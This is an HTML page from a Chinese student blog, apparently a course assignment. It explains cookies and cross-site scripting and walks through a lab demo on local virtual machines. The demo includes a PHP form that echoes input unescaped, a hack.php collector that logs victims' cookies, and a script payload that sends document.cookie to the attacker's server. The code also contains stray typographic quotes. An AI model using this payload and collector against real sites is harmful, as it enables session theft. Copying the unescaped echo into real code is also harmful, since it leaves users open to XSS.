@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"danggeovo.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="概念辨析cookie？ 什么是cookie?其工作机制是什么？  什么是cookie?在了解cookie之前，我们必须明确一个概念：即HTTP协议本身是无状态的，无状态是指Web浏览器与Web服务器之间不需要建立持久的连接，这意味着当一个客户端向服务器端发出请求，然后Web服务器返回响应（Response），连接就被关闭了，在服务器端不保留连接的有关信息。也就是说，HTTP请求只能由客户端发起，而">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss攻击测试">
+<meta property="og:url" content="https://danggeovo.github.io/2023/03/29/%E4%BD%9C%E4%B8%9A6.2%20xss%E5%B0%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="dangge の 小小世界">
+<meta property="og:description" content="概念辨析cookie？ 什么是cookie?其工作机制是什么？  什么是cookie?在了解cookie之前，我们必须明确一个概念：即HTTP协议本身是无状态的，无状态是指Web浏览器与Web服务器之间不需要建立持久的连接，这意味着当一个客户端向服务器端发出请求，然后Web服务器返回响应（Response），连接就被关闭了，在服务器端不保留连接的有关信息。也就是说，HTTP请求只能由客户端发起，而">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637589707976.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591066438.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591211048.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591494380.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591537624.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591686352.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591733731.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591813634.png">
+<meta property="og:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591857849.png">
+<meta property="article:published_time" content="2023-03-29T05:48:32.000Z">
+<meta property="article:modified_time" content="2023-11-08T10:13:33.923Z">
+<meta property="article:author" content="danggeOvO">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637589707976.png">
+
+
+<link rel="canonical" href="https://danggeovo.github.io/2023/03/29/%E4%BD%9C%E4%B8%9A6.2%20xss%E5%B0%8F%E6%B5%8B%E8%AF%95/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://danggeovo.github.io/2023/03/29/%E4%BD%9C%E4%B8%9A6.2%20xss%E5%B0%8F%E6%B5%8B%E8%AF%95/","path":"2023/03/29/作业6.2 xss小测试/","title":"xss攻击测试"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>xss攻击测试 | dangge の 小小世界</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">dangge の 小小世界</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">心之所向，无问西东</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/home" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5%E8%BE%A8%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">概念辨析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie%EF%BC%9F"><span class="nav-number">1.1.</span> <span class="nav-text">cookie？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFcookie"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">什么是cookie?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cookie%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6%EF%BC%9F"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">cookie的工作机制？</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.</span> <span class="nav-text">xss攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFxss%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">什么是xss攻击？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xss%E6%94%BB%E5%87%BB%E7%9A%84%E7%9B%AE%E7%9A%84"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">xss攻击的目的</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">2.</span> <span class="nav-text">准备工作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="nav-number">2.1.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="nav-number">2.2.</span> <span class="nav-text">使用脚本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">测试流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5-%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2"><span class="nav-number">3.0.1.</span> <span class="nav-text">第一步 脚本部署</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5-IP%E5%9C%B0%E5%9D%80%E6%9F%A5%E8%AF%A2"><span class="nav-number">3.0.2.</span> <span class="nav-text">第二步 IP地址查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.0.3.</span> <span class="nav-text">第三步 漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="nav-number">3.0.4.</span> <span class="nav-text">第四步 漏洞验证</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%94%B6%E8%8E%B7"><span class="nav-number">4.</span> <span class="nav-text">实验收获</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="danggeOvO"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">danggeOvO</p>
+  <div class="site-description" itemprop="description">记录生活与学习!</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/danggeOvO" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;danggeOvO" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:95239002@qq.com" title="E-Mail → mailto:95239002@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://danggeovo.github.io/2023/03/29/%E4%BD%9C%E4%B8%9A6.2%20xss%E5%B0%8F%E6%B5%8B%E8%AF%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="danggeOvO">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dangge の 小小世界">
+      <meta itemprop="description" content="记录生活与学习!">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="xss攻击测试 | dangge の 小小世界">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xss攻击测试
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-03-29 13:48:32" itemprop="dateCreated datePublished" datetime="2023-03-29T13:48:32+08:00">2023-03-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-11-08 18:13:33" itemprop="dateModified" datetime="2023-11-08T18:13:33+08:00">2023-11-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E3%80%90-%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86-%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">【-专业知识-】渗透测试</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E3%80%90-%E4%B8%93%E4%B8%9A%E7%9F%A5%E8%AF%86-%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E8%AF%BE%E7%A8%8B%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">课程记录</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="概念辨析"><a href="#概念辨析" class="headerlink" title="概念辨析"></a>概念辨析</h1><h2 id="cookie？"><a href="#cookie？" class="headerlink" title="cookie？"></a>cookie？</h2><blockquote>
+<p>什么是cookie?其工作机制是什么？</p>
+</blockquote>
+<h4 id="什么是cookie"><a href="#什么是cookie" class="headerlink" title="什么是cookie?"></a>什么是cookie?</h4><p>在了解cookie之前，我们必须明确一个概念：即<code>HTTP协议本身是无状态</code>的，无状态是指Web浏览器与Web服务器之间不需要建立持久的连接，这意味着当一个客户端向服务器端发出请求，然后Web服务器返回响应（Response），连接就被关闭了，在服务器端不保留连接的有关信息。也就是说，HTTP请求只能由客户端发起，而服务器不能主动向客户端发送数据。<br>而<code>cookie就是这个身份的证明</code>，实际上是一小段的文本信息（key-value格式）。<br>客户端向服务器发起请求，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。</p>
+<h4 id="cookie的工作机制？"><a href="#cookie的工作机制？" class="headerlink" title="cookie的工作机制？"></a>cookie的工作机制？</h4><blockquote>
+<p>当用户第一次访问并登陆一个网站的时候，cookie的设置以及发送会经历4个步骤：</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637589707976.png" alt="enter description here"></p>
+<h2 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h2><h4 id="什么是xss攻击？"><a href="#什么是xss攻击？" class="headerlink" title="什么是xss攻击？"></a>什么是xss攻击？</h4><blockquote>
+<p>Cross Site Scripting  ,跨站脚本攻击。</p>
+<blockquote>
+<p>人们经常将跨站脚本攻击（Cross Site Scripting）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为XSS。</p>
+</blockquote>
+</blockquote>
+<p>跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者<code>嵌入恶意脚本代码</code>到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p>
+<p>XSS漏洞可以追溯到上世纪90年代。大量的网站曾遭受XSS漏洞攻击或被发现此类漏洞，如Twitter、Facebook、MySpace、Orkut、新浪微博和百度贴吧。研究表明，最近几年XSS已经超过缓冲区溢出成为最流行的攻击方式，有68%的网站可能遭受此类攻击。根据开放网页应用安全计划（Open Web Application Security Project）公布的2021年统计数据，在Web安全威胁前10位中，XSS并入代码注入（Injection），而注入威胁排在top10的第三位。</p>
+<h4 id="xss攻击的目的"><a href="#xss攻击的目的" class="headerlink" title="xss攻击的目的"></a>xss攻击的目的</h4><p>常用的XSS攻击手段和目的有：</p>
+<ol>
+<li>盗用cookie，获取敏感信息。</li>
+<li>利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</li>
+<li>利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li>
+<li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li>
+<li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</li>
+</ol>
+<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p> <code>Website</code>：有XXS漏洞的合法网站,这里使用Kali-Linux2虚拟机作为网站服务器<br> <code>Website Visitor</code>：受害访问者，这里使用win10物理机进行代替<br> <code>Perptrator</code>：攻击者及数据接收网站。说明：将合法网站和攻击者接收网站都放在Kali虚拟机</p>
+<h2 id="使用脚本"><a href="#使用脚本" class="headerlink" title="使用脚本"></a>使用脚本</h2><blockquote>
+<p>对于website,使用submit.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;XSS Demo&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">    &lt;input style=<span class="string">&quot;width:300px;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;address1&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$_GET</span>[&quot;</span>address1<span class="string">&quot;]; ?&gt;&quot;</span> /&gt;</span><br><span class="line">            &lt;input type=“submit” value=“submit<span class="string">&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>对于Perptrator，使用hack.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$victim</span> = ‘XXS get the cookie:<span class="string">&#x27;. $_SERVER[&#x27;</span>REMOTE_ADDR<span class="string">&#x27;]. &#x27;</span>:<span class="string">&#x27; .$_GET[&#x27;</span>cookie<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">file_put_contents(‘1.txt&#x27;</span>, <span class="variable">$victim</span>);</span><br><span class="line"><span class="keyword">echo</span> welcome；</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>恶意payload:</p>
+</blockquote>
+<p><code>&quot;/&gt; &lt;script&gt;window.open(&quot;http://192.168.2.123/hack.php?cookie=&quot;+document.cookie);&lt;/script&gt;&lt;!-- </code></p>
+<h1 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h1><p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591066438.png" alt="测试流程"><br>这里把红蓝方合并，即既使用此虚拟机作为xss漏洞网站，有作为接收网站。</p>
+<h3 id="第一步-脚本部署"><a href="#第一步-脚本部署" class="headerlink" title="第一步 脚本部署"></a>第一步 脚本部署</h3><blockquote>
+<p>在虚拟机 &#x2F;var&#x2F;www&#x2F;html&#x2F;处进行部署，这里是apache服务的默认地址<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591211048.png" alt="脚本部署"></p>
+</blockquote>
+<h3 id="第二步-IP地址查询"><a href="#第二步-IP地址查询" class="headerlink" title="第二步 IP地址查询"></a>第二步 IP地址查询</h3><blockquote>
+<p>Kali使用ifconfig，win10 使用ipconfig进行查询。可知二者在一个子网。<br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591494380.png" alt="Kali ip"><br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591537624.png" alt="win10 ip"></p>
+</blockquote>
+<h3 id="第三步-漏洞利用"><a href="#第三步-漏洞利用" class="headerlink" title="第三步 漏洞利用"></a>第三步 漏洞利用</h3><blockquote>
+<p>在Kali里进行网站的访问与恶意payload的输入</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591686352.png" alt="eydm"><br><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591733731.png" alt="welcome"></p>
+<h3 id="第四步-漏洞验证"><a href="#第四步-漏洞验证" class="headerlink" title="第四步 漏洞验证"></a>第四步 漏洞验证</h3><blockquote>
+<p>在win10 物理机进行访问，查看结果</p>
+</blockquote>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591813634.png" alt="win10访问"></p>
+<p><img src="https://gitee.com/qidangge/picgo/raw/master/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1637591857849.png" alt="接收到cookie"></p>
+<h1 id="实验收获"><a href="#实验收获" class="headerlink" title="实验收获"></a>实验收获</h1><ol>
+<li>了解了cookie的概念与原理</li>
+<li>知道了xss攻击的一些基本知识</li>
+<li>实际演示了一次xss攻击的流程，对漏洞存在者、漏洞利用者、受害者的关系有了清晰的理解。</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>danggeOvO
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://danggeovo.github.io/2023/03/29/%E4%BD%9C%E4%B8%9A6.2%20xss%E5%B0%8F%E6%B5%8B%E8%AF%95/" title="xss攻击测试">https://danggeovo.github.io/2023/03/29/作业6.2 xss小测试/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/03/29/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E6%B5%81%E7%A8%8B%E6%A8%A1%E6%8B%9F%EF%BC%89/" rel="prev" title="永恒之蓝漏洞复现（流程模拟）">
+                  <i class="fa fa-angle-left"></i> 永恒之蓝漏洞复现（流程模拟）
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/03/29/%E4%BD%9C%E4%B8%9A5.1%20%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" rel="next" title="一句话木马">
+                  一句话木马 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">danggeOvO</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">337k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">10:13</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
